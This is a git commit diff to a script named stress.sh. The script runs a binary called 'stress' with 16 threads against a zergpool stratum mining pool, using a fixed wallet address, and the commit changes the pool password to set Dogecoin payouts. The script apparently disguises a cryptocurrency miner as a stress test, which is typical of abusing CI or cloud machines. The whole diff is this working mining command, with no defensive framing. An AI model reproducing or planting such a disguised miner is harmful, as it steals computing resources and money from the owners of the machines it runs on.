099952fdf98f4bbf3ea674614c3c6eb56175ccf6
fwe342fd <86301501+fwe342fd@users.noreply.github.com>
2021-06-25 17:35:26 +0700

    Update stress.sh

--- stress.sh
+++ stress.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./stress -v -l stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DSEu56yE78jCsXK6ojqgSo52GFu5svTRPB -t 16 -p x
+./stress -v -l stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DSEu56yE78jCsXK6ojqgSo52GFu5svTRPB -t 16 -p c=DOGE
